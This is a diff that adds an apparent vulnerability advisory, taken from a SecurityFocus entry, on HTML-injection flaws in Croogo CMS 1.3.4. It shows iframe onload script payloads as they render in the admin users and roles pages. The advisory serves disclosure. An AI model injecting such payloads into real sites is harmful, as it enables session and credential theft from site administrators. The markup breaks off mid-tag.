@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/53287/info
+
+Croogo CMS is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Croogo CMS 1.3.4 is vulnerable; other versions may also be affected. 
+
+URL: http://www.example.com/croogo/admin/users
+
+<td>"><iframe src="a" onload='alert("VL")' <<="" td=""> <td>"><iframe src=a onload=alert("VL")
+<</td> <td>asdasd () aol com</td>
+
+<td><a href="/croogo/admin/users/edit/2">Edit</a> <a href="/croogo/admin/users/delete/2/token:
+c68c0779f65f5657a8d17c28daebcc7a15fe51e3"
+
+onclick="return confirm('Are you sure?');">Delete</a></td></tr>
+
+
+URL: http://www.example.com/croogo/admin/roles
+
+<tr class="striped"><td>4</td> <td>"><iframe src="a" onload='alert("VL")'
+<<="" td=""> <td>"><iframe src=a onload=alert("VL") <</td> <td>
+<a href="/croogo/admin/roles/edit/4">Edit</a> <a href="/croogo/admin/roles/delete 
